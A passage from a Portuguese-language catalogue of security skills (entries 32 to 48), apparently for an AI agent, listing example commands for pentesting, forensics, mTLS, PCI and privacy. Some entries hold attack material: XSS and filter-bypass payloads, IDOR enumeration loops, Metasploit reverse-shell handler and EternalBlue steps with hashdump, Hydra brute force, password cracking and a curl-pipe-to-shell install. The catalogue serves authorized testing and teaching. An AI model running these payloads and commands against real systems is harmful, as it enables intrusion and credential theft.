- **Self-hosted Runner Attacks:** Explorar runners self-hosted
- **Cache Poisoning:** Envenenar cache de dependências
- **Supply Chain Attacks:** Comprometer builds

**Integração com outras skills:**
- `supply-chain-security`: Para segurança de supply chain
- `security-scanning-security-sast`: Para SAST
- `audit-skills`: Para auditoria de skills

**Padrões e anti-padrões:**
✅ Fazer: Usar actions de pinned versions, validar inputs, proteger secrets
❌ Evitar: Usar pull_request_target, expor secrets, confiar em entradas não confiáveis

**Dicas de performance:**
- Use CodeQL para análise estática
- Implemente branch protection
- Use OIDC para autenticação

**Comandos úteis:**
```bash
# Verificar workflows
find .github/workflows -name "*.yml" -exec cat {} \;

# Analisar com CodeQL
codeql database analyze . github-actions

# Verificar secrets
grep -r "secrets\." .github/workflows/
```

**Referências:**
- [GitHub Actions Security](https://docs.github.com/en/actions/security-guides)
- [PwnRequest](https://github.com/AdnaneKhan/ActionsShellInjection)
- [StepSecurity](https://stepsecurity.io/)

---

### 32. html-injection-testing
**Descrição:** Identificar e explorar vulnerabilidades de injeção HTML que permitem injetar conteúdo HTML malicioso em aplicações web.

**Quando usar:**
- Testes de penetração em formulários
- Verificação de validação de input
- Auditoria de renderização de HTML

**Exemplos práticos:**
```html
<!-- Exemplo 1: Teste básico -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- Exemplo 2: Bypass de filtros -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- Exemplo 3: Injeção em atributo -->
" onfocus="alert(1)" autofocus="
'-alert(1)-'

<!-- Exemplo 4: Template injection -->
{{7*7}}
${7*7}
<%= 7*7 %>
```

**Casos de uso avançados:**
- **Stored HTML Injection:** Persistência de payloads
- **DOM-based Injection:** Injeção via JavaScript
- **Server-side Template Injection:** SSTI

**Integração com outras skills:**
- `xss-html-injection`: Para XSS
- `frontend-security-coder`: Para prevenção
- `file-uploads`: Para uploads de HTML

**Padrões e anti-padrões:**
✅ Fazer: Validar todos os inputs, usar encoding, implementar CSP
❌ Evitar: Confiar em filtros client-side, permitir HTML arbitrário, ignorar encoding

**Dicas de performance:**
- Use ferramentas automatizadas
- Teste em diferentes contexts
- Analise logs para padrões

**Comandos úteis:**
```bash
# Ferramenta de teste
dalfox url "https://example.com?q=" -p test.txt

# Teste manual
curl -X POST -d "comment=<img src=x onerror=alert(1)>" https://example.com/comment

# Análise de logs
cat access.log | grep -i "img\|svg\|onerror"
```

**Referências:**
- [OWASP HTML Injection](https://owasp.org/www-community/attacks/HTML_Injection)
- [XSS Attack Vectors](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS)
- [HTML Sanitization](https://owasp.org/www-project-java-html-sanitizer/)

---

### 33. idor-testing
**Descrição:** Metodologias sistemáticas para identificar e explorar vulnerabilidades IDOR (Insecure Direct Object Reference).

**Quando usar:**
- Testes de penetração em APIs
- Verificação de autorização
- Auditoria de controles de acesso

**Exemplos práticos:**
```bash
# Exemplo 1: Teste básico de IDOR
# Alterar ID na URL
curl "https://example.com/api/users/123" -H "Authorization: Bearer token"
curl "https://example.com/api/users/124" -H "Authorization: Bearer token"

# Exemplo 2: Teste em parâmetros POST
curl -X POST -d '{"user_id": 124}' https://example.com/api/profile

# Exemplo 3: Enumeração de IDs
for i in {1..100}; do
  curl -s "https://example.com/api/users/$i" -H "Authorization: Bearer token"
done

# Exemplo 4: Teste com UUIDs
curl "https://example.com/api/documents/550e8400-e29b-41d4-a716-446655440000"
```

**Casos de uso avançados:**
- **IDOR em APIs REST:** Testar endpoints CRUD
- **IDOR em GraphQL:** Testar queries
- **Horizontal/Vertical Privilege Escalation:** Escalação de privilégios

**Integração com outras skills:**
- `broken-authentication`: Para autenticação
- `ffuf-web-fuzzing`: Para descoberta de endpoints
- `auth-implementation-patterns`: Para implementação

**Padrões e anti-padrões:**
✅ Fazer: Usar UUIDs, implementar autorização server-side, testar todos os endpoints
❌ Evitar: Confiar em IDs incrementais, ignorar autorização, não testar variações

**Dicas de performance:**
- Use ferramentas automatizadas
- Teste diferentes níveis de acesso
- Analise padrões de autorização

**Comandos úteis:**
```bash
# Ferramenta de teste
python3 idor_scanner.py -t https://example.com/api -u user.txt

# Enumeração
seq 1 1000 | xargs -I {} curl -s "https://example.com/api/items/{}"

# Teste com diferentes usuários
for user in user1 user2 user3; do
  curl -s "https://example.com/api/profile" -H "Authorization: Bearer $user_token"
done
```

**Referências:**
- [OWASP IDOR](https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference)
- [Testing for IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Input_Validation_Testing/11-Testing_for_Path_Traversal)
- [IDOR Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)

---

### 34. laravel-security-audit
**Descrição:** Auditor de segurança para aplicações Laravel. Analisa código vulnerabilidades, configurações incorretas e práticas inseguras.

**Quando usar:**
- Auditoria de aplicações Laravel
- Revisão de configurações de segurança
- Verificação de práticas seguras

**Exemplos práticos:**
```php
// Exemplo 1: Verificar mass assignment
// App\Models\User.php
protected $fillable = ['name', 'email']; // ✅ CORRETO
// protected $guarded = []; // ❌ INCORRETO

// Exemplo 2: SQL Injection
// ❌ INCORRETO
DB::select("SELECT * FROM users WHERE id = " . $request->id);

// ✅ CORRETO
DB::select("SELECT * FROM users WHERE id = ?", [$request->id]);

// Exemplo 3: Verificar configurações
// config/app.php
'debug' => env('APP_DEBUG', false), // ✅ Produção
// 'debug' => true, // ❌ Nunca em produção

// Exemplo 4: CSRF Protection
// routes/web.php
Route::post('/form', [Controller::class, 'store'])->middleware('csrf');
```

**Casos de uso avançados:**
- **Laravel Nova Security:** Auditoria de painéis administrativos
- **API Security:** Segurança de APIs Laravel
- **Queue Security:** Segurança de filas

**Integração com outras skills:**
- `security-and-hardening`: Para hardening geral
- `auth-implementation-patterns`: Para autenticação
- `sql-injection-testing`: Para SQL injection

**Padrões e anti-padrões:**
✅ Fazer: Usar Eloquent, implementar validação, verificar configurações
❌ Evitar: Usar queries raw, desabilitar CSRF, expor debug em produção

**Dicas de performance:**
- Use Laravel Debugbar para desenvolvimento
- Implemente cache para consultas frequentes
- Use Horizon para filas

**Comandos úteis:**
```bash
# Verificar dependências
composer audit

# Rodar testes
php artisan test

# Verificar configurações
php artisan config:cache
php artisan route:cache
```

**Referências:**
- [Laravel Security Documentation](https://laravel.com/docs/10.x/security)
- [Laravel Best Practices](https://laravel.com/docs/10.x/lifecycle#determining-the-current-environment)
- [OWASP PHP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Cheat_Sheet.html)

---

### 35. linux-privilege-escalation
**Descrição:** Executar avaliações sistemáticas de escalação de privilégios em sistemas Linux.

**Quando usar:**
- Testes de penetração em ambientes Linux
- Identificação de caminhos para root
- Auditoria de configurações de segurança

**Exemplos práticos:**
```bash
# Exemplo 1: Verificar SUID bins
find / -perm -4000 -type f 2>/dev/null

# Exemplo 2: Verificar capabilities
getcap -r / 2>/dev/null

# Exemplo 3: Verificar sudo
sudo -l

# Exemplo 4: Verificar kernel
uname -a
cat /etc/issue
```

**Casos de uso avançados:**
- **Container Escape:** Sair de containers
- **Lateral Movement:** Movimentação lateral
- **Persistence:** Manter acesso

**Integração com outras skills:**
- `windows-privilege-escalation`: Para Windows
- `metasploit-framework`: Para exploração
- `ssh-penetration-testing`: Para SSH

**Padrões e anti-padrões:**
✅ Fazer: Documentar caminhos, testar em staging, obter autorização
❌ Evitar: Testar em produção, ignorar impacto, não validar descobertas

**Dicas de performance:**
- Use linPEAS ou linux-exploit-suggester
- Automatize verificações
- Mantenha base de dados de exploits

**Comandos úteis:**
```bash
# LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# GTFOBins
# Consultar https://gtfobins.github.io/
```

**Referências:**
- [GTFOBins](https://gtfobins.github.io/)
- [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [LinPEAS](https://github.com/peass-ng/PEASS-ng)

---

### 36. malware-analyst
**Descrição:** Analista de malware especialista em pesquisa defensiva de malware, inteligência de ameaças e resposta a incidentes.

**Quando usar:**
- Análise de amostras de malware
- Resposta a incidentes
- Desenvolvimento de contra-medidas

**Exemplos práticos:**
```python
# Exemplo 1: Análise estática
import pefile

pe = pefile.PE('malware.exe')
print(f"Entry point: 0x{pe.OPTIONAL_HEADER.AddressOfEntryPoint:X}")
print(f"Sections: {[s.Name.decode().rstrip('\x00') for s in pe.sections]}")

# Exemplo 2: Análise dinâmica com sandbox
# Usar Cuckoo Sandbox ou Any.Run

# Exemplo 3: Extração de strings
strings malware.exe | grep -i "http\|https\|\.com\|\.ru"

# Exemplo 4: Verificar hash
md5sum malware.exe
sha256sum malware.exe
```

**Casos de uso avançados:**
- **Reverse Engineering:** Engenharia reversa avançada
- **Threat Intelligence:** Coleta de IOC
- **Malware Classification:** Classificação automática

**Integração com outras skills:**
- `binary-analysis-patterns`: Para análise de binários
- `memory-forensics`: Para análise de memória
- `protocol-reverse-engineering`: Para protocolos

**Padrões e anti-padrões:**
✅ Fazer: Usar sandbox, documentar IOC, compartilhar inteligência
❌ Evitar: Analisar em produção, ignorar anti-análise, não reportar achados

**Dicas de performance:**
- Use sandboxes automatizadas
- Mantenha base de dados de malware
- Use ferramentas de IOCs

**Comandos úteis:**
```bash
# Yara
yara -r rules/ malware.exe

# ClamAV
clamscan malware.exe

# VirusTotal
python3 vt.py file malware.exe
```

**Referências:**
- [VirusTotal](https://www.virustotal.com/)
- [ANY.RUN](https://any.run/)
- [Malware Analysis Fundamentals](https://www.malwaretech.com/)

---

### 37. memory-forensics
**Descrição:** Técnicas abrangentes para aquisição, análise e extração de artefatos de dumps de memória.

**Quando usar:**
- Resposta a incidentes
- Análise de malware
- Investigação forense

**Exemplos práticos:**
```bash
# Exemplo 1: Capturar dump de memória
# Linux
sudo dd if=/dev/mem of=memory.dump

# Windows
winpmem_mini_x64.exe memory.dump

# Exemplo 2: Analisar com Volatility
volatility -f memory.dump imageinfo
volatility -f memory.dump --profile=Win7SP1x64 pslist

# Exemplo 3: Extrair processos
volatility -f memory.dump --profile=Win7SP1x64 procscan

# Exemplo 4: Extrair artefatos de rede
volatility -f memory.dump --profile=Win7SP1x64 netscan
```

**Casos de uso avançados:**
- **Rootkit Detection:** Detectar rootkits em memória
- **Encryption Key Recovery:** Recuperar chaves de criptografia
- **Process Injection:** Detectar injeção de código

**Integração com outras skills:**
- `malware-analyst`: Para análise de malware
- `binary-analysis-patterns`: Para análise de binários
- `incident-response`: Para resposta a incidentes

**Padrões e anti-padrões:**
✅ Fazer: Capturar memória volátil primeiro, usar ferramentas confiáveis, documentar cadeia de custódia
❌ Evitar: Modificar evidências, usar ferramentas não confiáveis, ignorar artefatos voláteis

**Dicas de performance:**
- Use Volatility 3 para análises modernas
- Mantenha plugins atualizados
- Use scripts Python para automação

**Comandos úteis:**
```bash
# Volatility 3
vol -f memory.dump windows.pslist
vol -f memory.dump windows.netscan
vol -f memory.dump windows.hashdump

# Rekall
rekall -f memory.dump pslist
rekall -f memory.dump netscan
```

**Referências:**
- [Volatility Foundation](https://www.volatilityfoundation.org/)
- [Rekall](https://github.com/google/rekall)
- [Memory Forensics Guide](https://www.sans.org/white-papers/memory-forensics/)

---

### 38. metasploit-framework
**Descrição:** Framework de exploração para assessments de segurança autorizados. **APENAS PARA USO AUTORIZADO.**

**Quando usar:**
- Testes de penetração autorizados
- Demonstrações de exploração
- Validação de vulnerabilidades

**Exemplos práticos:**
```bash
# Exemplo 1: Configurar listener
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit

# Exemplo 2: Explorar vulnerabilidade
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
exploit

# Exemplo 3: Meterpreter session
sysinfo
getuid
hashdump

# Exemplo 4: Pivoting
run autoroute -s 192.168.2.0/24
```

**Casos de uso avançados:**
- **Client-side Attacks:** Exploração via navegador
- **Post-Exploitation:** Pós-exploração
- **Pivoting:** Movimentação lateral

**Integração com outras skills:**
- `ethical-hacking-methodology`: Para metodologia
- `pentest-commands`: Para comandos
- `red-team-tactics`: Para táticas avançadas

**Padrões e anti-padrões:**
✅ Fazer: Usar em ambientes autorizados, documentar explorações, obter permissão
❌ Evitar: Usar sem autorização, explorar em produção, ignorar escopo

**Dicas de performance:**
- Use workspaces para organizar
- Mantenha módulos atualizados
- Use automação com resource scripts

**Comandos úteis:**
```bash
# Iniciar Metasploit
msfconsole

# Buscar módulos
search type:exploit platform:windows smb

# Verificar exploits
info exploit/windows/smb/ms17_010_eternalblue
```

**Referências:**
- [Metasploit Documentation](https://docs.metasploit.com/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Rapid7 Documentation](https://docs.rapid7.com/metasploit/)

---

### 39. mtls-configuration
**Descrição:** Configurar TLS mútuo (mTLS) para comunicação zero-trust entre serviços.

**Quando usar:**
- Comunicação zero-trust
- Gerenciamento de certificados
- Segurança de microsserviços

**Exemplos práticos:**
```bash
# Exemplo 1: Gerar CA
openssl req -x509 -sha256 -days 365 -newkey rsa:4096 -keyout ca.key -out ca.crt

# Exemplo 2: Gerar certificado de servidor
openssl req -new -newkey rsa:4096 -nodes -keyout server.key -out server.csr
openssl x509 -req -sha256 -days 365 -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt

# Exemplo 3: Configurar nginx para mTLS
server {
    listen 443 ssl;
    ssl_certificate /etc/nginx/server.crt;
    ssl_certificate_key /etc/nginx/server.key;
    ssl_client_certificate /etc/nginx/ca.crt;
    ssl_verify_client on;
}

# Exemplo 4: Kubernetes mTLS
apiVersion: networking.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
spec:
  mtls:
    mode: STRICT
```

**Casos de uso avançados:**
- **Service Mesh:** mTLS com Istio/Linkerd
- **API Gateway:** mTLS para APIs
- **Zero Trust Network:** Rede zero trust

**Integração com outras skills:**
- `auth-implementation-patterns`: Para autenticação
- `secrets-management`: Para chaves
- `container-security-hardening`: Para containers

**Padrões e anti-padrões:**
✅ Fazer: Automatizar rotação de certificados, monitorar expiração, usar CA própria
❌ Evitar: Compartilhar chaves, ignorar expiração, usar certificados auto-assinados em produção

**Dicas de performance:**
- Use Let's Encrypt para certificados públicos
- Implemente automação com cert-manager
- Use HSM para chaves sensíveis

**Comandos úteis:**
```bash
# Verificar certificado
openssl x509 -in cert.pem -text -noout

# Testar mTLS
curl --cert client.crt --key client.key --cacert ca.crt https://example.com

# Verificar cadeia
openssl verify -CAfile ca.crt server.crt
```

**Referências:**
- [Istio mTLS](https://istio.io/latest/docs/ops/configuration/traffic-management/mtls/)
- [Cert Manager](https://cert-manager.io/docs/)
- [OWASP TLS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/TLS_Cheat_Sheet.html)

---

### 40. pci-compliance
**Descrição:** Revisar fluxos de dados de pagamento e evidências de controle de engenharia para avaliação PCI.

**Quando usar:**
- Preparação para auditoria PCI-DSS
- Revisão de sistemas de pagamento
- Verificação de conformidade

**Exemplos práticos:**
```python
# Exemplo 1: Verificar armazenamento de dados
def check_card_data_storage():
    # Verificar se dados de cartão são armazenados
    # PCI-DSS proíbe armazenamento de CVV/CVC
    # Limita armazenamento de track data
    pass

# Exemplo 2: Criptografia de dados
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Criptografar dados sensíveis
encrypted = cipher_suite.encrypt(b"card data")

# Exemplo 3: Verificar acesso
def check_access_controls():
    # Verificar se apenas pessoal autorizado acessa
    # Verificar logs de acesso
    pass
```

**Casos de uso avançados:**
- **Tokenização:** Substituir dados de cartão por tokens
- **Point-to-Point Encryption:** Criptografia ponta a ponta
- **PCI DSS 4.0:** Implementar novos requisitos

**Integração com outras skills:**
- `fsi-compliance-checker`: Para conformidade financeira
- `security-compliance-compliance-check`: Para multi-standard
- `aws-compliance-checker`: Para AWS

**Padrões e anti-padrões:**
✅ Fazer: Minimizar dados armazenados, criptografar em trânsito e repouso, manter logs
❌ Evitar: Armazenar CVV, compartilhar credenciais, ignorar segmentação

**Dicas de performance:**
- Use tokenização para reduzir escopo
- Implemente segmentação de rede
- Use ferramentas de scanning PCI

**Comandos úteis:**
```bash
# PCI DSS Quick Reference
# https://www.pcisecuritystandards.org/document_library/

# Verificar conformidade
aws configservice get-compliance-by-config-rule --config-rule-name pci-dss

# Scan de vulnerabilidades
nessuscli scan list
```

**Referências:**
- [PCI Security Standards Council](https://www.pcisecuritystandards.org/)
- [PCI DSS Quick Reference Guide](https://www.pcisecuritystandards.org/document_library/)
- [PCI SSC Document Library](https://www.pcisecuritystandards.org/document_library/)

---

### 41. pentest-checklist
**Descrição:** Checklist abrangente para planejar, executar e acompanhar testes de penetração.

**Quando usar:**
- Planejamento de assessments
- Acompanhamento de execução
- Garantia de cobertura completa

**Exemplos práticos:**
```markdown
# Checklist de Pentest

## Pré-engajamento
- [ ] Escopo definido e documentado
- [ ] Autorização obtida (Rules of Engagement)
- [ ] Contatos de emergência definidos
- [ ] Ferramentas preparadas

## Reconhecimento
- [ ] OSINT concluído
- [ ] DNS enumeration
- [ ] Port scanning
- [ ] Service identification

## Análise de Vulnerabilidades
- [ ] Vulnerability scanning
- [ ] Manual testing
- [ ] Exploitation attempts

## Pós-exploração
- [ ] Privilege escalation
- [ ] Lateral movement
- [ ] Data exfiltration (simulated)

## Relatório
- [ ] Achados documentados
- [ ] Evidências coletadas
- [ ] Recomendações elaboradas
- [ ] Review técnico realizado
```

**Casos de uso avançados:**
- **Assessment de Segurança:** Pentests completos
- **Red Team Operations:** Simulações avançadas
- **Compliance Assessments:** Verificações de conformidade

**Integração com outras skills:**
- `ethical-hacking-methodology`: Para metodologia
- `pentest-commands`: Para comandos
- `security-auditor`: Para auditorias

**Padrões e anti-padrões:**
✅ Fazer: Usar checklists padronizadas, adaptar ao contexto, revisar achados
❌ Evitar: Pular etapas, ignorar escopo, não documentar

**Dicas de performance:**
- Use ferramentas de gestão de projetos
- Automatize verificações repetitivas
- Mantenha templates atualizados

**Comandos úteis:**
```bash
# Template de checklist
cat pentest-checklist.md | grep -E "^\- \[.\]"

# Verificar conclusão
grep -c "\[x\]" pentest-checklist.md
```

**Referências:**
- [PTES](http://www.pentest-standard.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST SP 800-115](https://csrc.nist.gov/publications/detail/sp/800-115/final)

---

### 42. pentest-commands
**Descrição:** Referência abrangente de comandos para ferramentas de testes de penetração.

**Quando usar:**
- Consulta rápida durante assessments
- Automação de tarefas comuns
- Treinamento de equipes

**Exemplos práticos:**
```bash
# Nmap - Varredura de rede
nmap -sV -sC -O target.com
nmap -p- -T4 target.com
nmap --script=vuln target.com

# Hydra - Brute force
hydra -l admin -P wordlist.txt ssh://target.com
hydra -l admin -P wordlist.txt http-post-form "/login:user=^USER^&pass=^PASS^"

# SQLmap - SQL injection
sqlmap -u "https://example.com/?id=1" --dbs
sqlmap -r request.txt --batch

# Gobuster - Directory brute force
gobuster dir -u https://example.com -w wordlist.txt

# John the Ripper - Password cracking
john --wordlist=wordlist.txt hash.txt
john --format=raw-md5 hash.txt
```

**Casos de uso avançados:**
- **Automação de Pentest:** Scripts de automação
- **Customização de Ferramentas:** Adaptar comandos
- **Integração de Ferramentas:** Combinar output

**Integração com outras skills:**
- `ethical-hacking-methodology`: Para metodologia
- `pentest-checklist`: Para planejamento
- `scanning-tools`: Para varreduras

**Padrões e anti-padrões:**
✅ Fazer: Testar em staging, documentar comandos, validar resultados
❌ Evitar: Usar em produção, ignorar impacto, não validar falsos positivos

**Dicas de performance:**
- Use aliases para comandos frequentes
- Crie scripts para tarefas repetitivas
- Mantenha wordlists atualizadas

**Comandos úteis:**
```bash
# Aliases úteis
alias nmap-full="nmap -sV -sC -O -p- -T4"
alias hydra-ssh="hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://"

# Scripts de automação
#!/bin/bash
target=$1
nmap -sV -sC -O $target > nmap_results.txt
gobuster dir -u http://$target -w /usr/share/wordlists/dirb/common.txt > gobuster_results.txt
```

**Referências:**
- [Hacking Tools](https://github.com/enaqx/awesome-pentest)
- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks](https://book.hacktricks.xyz/)

---

### 43. privacy-by-design
**Descrição:** Construir aplicativos que coletam dados do usuário com proteções de privacidade desde o início.

**Quando usar:**
- Design de novos sistemas
- Implementação de requisitos de privacidade
- Conformidade com regulamentações

**Exemplos práticos:**
```python
# Exemplo 1: Minimização de dados
class UserPreferences:
    def __init__(self):
        # Apenas dados necessários
        self.language = 'pt-BR'
        self.theme = 'dark'

# Exemplo 2: Anonimização
import hashlib

def anonymize_email(email):
    return hashlib.sha256(email.encode()).hexdigest()

# Exemplo 3: Consentimento granular
class ConsentManager:
    def __init__(self, user_id):
        self.user_id = user_id
        self.consents = {
            'analytics': False,
            'marketing': False,
            'third_party': False
        }
    
    def update_consent(self, purpose, granted):
        self.consents[purpose] = granted
```

**Casos de uso avançados:**
- **Data Protection Impact Assessment:** Avaliação de impacto
- **Privacy Enhancing Technologies:** TECNOLOGIAS de aprimoramento
- **Differential Privacy:** Privacidade diferencial

**Integração com outras skills:**
- `gdpr-data-handling`: Para implementação GDPR
- `security-compliance-compliance-check`: Para conformidade
- `security-and-hardening`: Para segurança geral

**Padrões e anti-padrões:**
✅ Fazer: Coletar apenas dados necessários, implementar criptografia, dar controle ao usuário
❌ Evitar: Coletar dados excessivos, ignorar consentimento, não oferecer opt-out

**Dicas de performance:**
- Use pseudonimização para reduzir riscos
- Implemente retenção de dados automática
- Use ferramentas de privacidade

**Comandos úteis:**
```bash
# Verificar dados coletados
grep -r "collect\|store\|process" src/

# Analisar fluxo de dados
# Usar ferramentas como DataFlow Scanner
```

**Referências:**
- [GDPR.eu](https://gdpr.eu/)
- [Privacy by Design](https://www.privacybydesign.ca/)
- [NIST Privacy Framework](https://www.nist.gov/privacy-framework)

---

### 44. production-audit
**Descrição:** Auditar repositório publicado para lacunas de prontidão em produção incluindo RLS, webhooks, segredos, grants, idempotência Stripe, UX mobile e saúde de deploy.

**Quando usar:**
- Auditoria pré-lançamento
- Revisão de segurança em produção
- Verificação de configurações

**Exemplos práticos:**
```bash
# Exemplo 1: Verificar segredos em código
trufflehog filesystem --directory=/path/to/repo

# Exemplo 2: Verificar configurações de produção
# Verificar .env.example, docker-compose.yml
cat .env.example | grep -v "^#"

# Exemplo 3: Verificar dependências
npm audit --audit-level=high
pip-audit

# Exemplo 4: Verificar testes
npm test -- --coverage
```

**Casos de uso avançados:**
- **Pre-launch Audit:** Auditoria completa antes do lançamento
- **Security Review:** Revisão de segurança
- **Compliance Check:** Verificação de conformidade

**Integração com outras skills:**
- `cyber-audit`: Para auditoria de exposição
- `security-auditor`: Para auditorias
- `audit-skills`: Para auditoria de skills

**Padrões e anti-padrões:**
✅ Fazer: Automatizar verificações, usar checklists, remediar antes do lançamento
❌ Evitar: Lançar com vulnerabilidades, ignorar alertas, não testar em staging

**Dicas de performance:**
- Use CI/CD para verificações automáticas
- Implemente gates de qualidade
- Monitore em produção

**Comandos úteis:**
```bash
# Verificar configurações
docker-compose config

# Verificar variáveis de ambiente
printenv | grep -i "secret\|password\|key"

# Verificar logs
docker logs <container>
```

**Referências:**
- [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/)
- [Production Readiness Review](https://github.com/Netflix/production-readiness-review)
- [12-Factor App](https://12factor.net/)

---

### 45. protocol-reverse-engineering
**Descrição:** Técnicas abrangentes para capturar, analisar e documentar protocolos de rede.

**Quando usar:**
- Pesquisa de segurança
- Interoperabilidade
- Depuração de protocolos

**Exemplos práticos:**
```bash
# Exemplo 1: Capturar tráfego
tcpdump -i eth0 -w capture.pcap

# Exemplo 2: Analisar com Wireshark
tshark -r capture.pcap -Y "http" -T fields -e http.host

# Exemplo 3: Analisar protocolo custom
python3 -c "
import struct
with open('capture.pcap', 'rb') as f:
    data = f.read()
    # Analisar header
    header = struct.unpack('IHHiIII', data[:24])
"

# Exemplo 4: Documentar protocolo
# Criar spec em Markdown ou Protobuf
```

**Casos de uso avançados:**
- **IoT Protocol Analysis:** Analisar protocolos de dispositivos
- **Proprietary Protocol Reverse:** Reverse engineer protocolos proprietários
- **Network Forensics:** Forense de rede

**Integração com outras skills:**
- `wireshark-analysis`: Para análise de rede
- `firmware-analyst`: Para firmware
- `binary-analysis-patterns`: Para binários

**Padrões e anti-padrões:**
✅ Fazer: Capturar dados suficientes, documentar achados, usar ferramentas adequadas
❌ Evitar: Ignorar criptografia, não documentar, pular validação

**Dicas de performance:**
- Use filtros para reduzir volume
- Automatize análise com scripts
- Mantenha biblioteca de protocolos

**Comandos úteis:**
```bash
# Capturar com filtros
tcpdump -i eth0 -w capture.pcap port 443

# Analisar protocolo
scapy -r capture.pcap

# Documentar
python3 -m protocol_parser capture.pcap
```

**Referências:**
- [Wireshark Documentation](https://www.wireshark.org/docs/)
- [Protocol Analysis](https://www.practicalpacketanalysis.com/)
- [Scapy Documentation](https://scapy.readthedocs.io/)

---

### 46. red-team-tactics
**Descrição:** Princípios de táticas de red team baseados no MITRE ATT&CK.

**Quando usar:**
- Simulações de ataques avançados
- Exercícios de defesa
- Validação de controles de segurança

**Exemplos práticos:**
```markdown
# Exemplo 1: Fases de Red Team
1. Reconhecimento
   - OSINT
   - Social engineering
2. Acesso inicial
   - Phishing
   - Exploitation
3. Estabelecimento de posição
   - Persistence
   - Privilege escalation
4. Coleta de dados
   - Internal reconnaissance
   - Data exfiltration
5. Cobertura
   - Anti-forensics
   - Cleanup
```

**Casos de uso avançados:**
- **APT Simulation:** Simular grupos ameaça avançados
- **Purple Team:** Colaboração ofensiva/defensiva
- **Assessment de Resiliência:** Testar capacidade de detecção

**Integração com outras skills:**
- `ethical-hacking-methodology`: Para metodologia
- `red-team-tools`: Para ferramentas
- `threat-modeling-expert`: Para modelagem

**Padrões e anti-padrões:**
✅ Fazer: Documentar todas as ações, obter autorização, focar em objetivos
❌ Evitar: Causar danos, ignorar escopo, não reportar achados

**Dicas de performance:**
- Use ferramentas como MITRE ATT&CK Navigator
- Mantenha playbooks atualizados
- Valide com o time de defesa

**Comandos úteis:**
```bash
# MITRE ATT&CK Navigator
# https://attack.mitre.org/navigator/

# Ferramentas de Red Team
# Cobalt Strike, Sliver, Havoc
```

**Referências:**
- [MITRE ATT&CK](https://attack.mitre.org/)
- [Red Team Journal](https://www.redteamjournal.com/)
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)

---

### 47. red-team-tools
**Descrição:** Metodologias e fluxos de trabalho comprovados de pesquisadores de segurança para reconhecimento, descoberta de vulnerabilidades e bug bounty.

**Quando usar:**
- Automação de tarefas de segurança
- Cobertura de superfícies de ataque
- Pesquisa de vulnerabilidades

**Exemplos práticos:**
```bash
# Exemplo 1: Reconhecimento automatizado
subfinder -d example.com -o subdomains.txt
httpx -l subdomains.txt -o live.txt

# Exemplo 2: Descoberta de vulnerabilidades
nuclei -l live.txt -t nuclei-templates/

# Exemplo 3: Análise de superfície de ataque
katana -u https://example.com -d 2

# Exemplo 4: Fuzzing
ffuf -u https://example.com/FUZZ -w wordlist.txt
```

**Casos de uso avançados:**
- **Bug Bounty Programs:** Estruturar programas
- **Security Research:** Pesquisa avançada
- **Automated Discovery:** Descoberta automatizada

**Integração com outras skills:**
- `ethical-hacking-methodology`: Para metodologia
- `pentest-commands`: Para comandos
- `scanning-tools`: Para varreduras

**Padrões e anti-padrões:**
✅ Fazer: Automatizar tarefas, usar ferramentas adequadas, documentar descobertas
❌ Evitar: Usar sem autorização, ignorar escopo, não validar resultados

**Dicas de performance:**
- Use pipelines de automação
- Combine ferramentas para cobertura
- Use APIs quando disponíveis

**Comandos úteis:**
```bash
# Pipeline completo
subfinder -d example.com -silent | httpx -silent | nuclei -t nuclei-templates/

# Ferramentas essenciais
# subfinder, httpx, nuclei, katana, ffuf, sqlmap
```

**Referências:**
- [ProjectDiscovery](https://github.com/projectdiscovery)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)

---

### 48. reverse-engineer
**Descrição:** Engenheiro reverso especialista em análise de binários, desmontagem, descompilação e análise de software.

**Quando usar:**
- Análise de software proprietário
- Engenharia reversa de malware
- Auditoria de segurança

**Exemplos práticos:**
```bash
# Exemplo 1: Descompilar com Ghidra
# Abrir binário e usar decompiler

# Exemplo 2: Desmontar com objdump
objdump -d binary | less

# Exemplo 3: Analisar com GDB
gdb ./binary
(gdb) disassemble main
(gdb) break *0x401000
(gdb) run

# Exemplo 4: Análise de strings
strings -n 8 binary | grep -i "password\|secret\|key"
```

**Casos de uso avançados:**
- **Malware Analysis:** Análise detalhada de malware
- **Firmware Reverse Engineering:** Engenharia reversa de firmware
- **Protocol Reverse:** Reverse engineering de protocolos

**Integração com outras skills:**
- `binary-analysis-patterns`: Para análise de binários
- `malware-analyst`: Para análise de malware
- `firmware-analyst`: Para firmware

**Padrões e anti-padrões:**
✅ Fazer: Usar sandbox, documentar achados, comparar versões
❌ Evitar: Analisar em produção, ignorar anti-análise, pular etapas

**Dicas de performance:**
- Use ferramentas de descompilação
- Mantenha biblioteca de padrões
- Use automação para análise

**Comandos úteis:**
```bash
# Ghidra
ghidraRun binary

# Radare2
r2 -A binary

# Binwalk
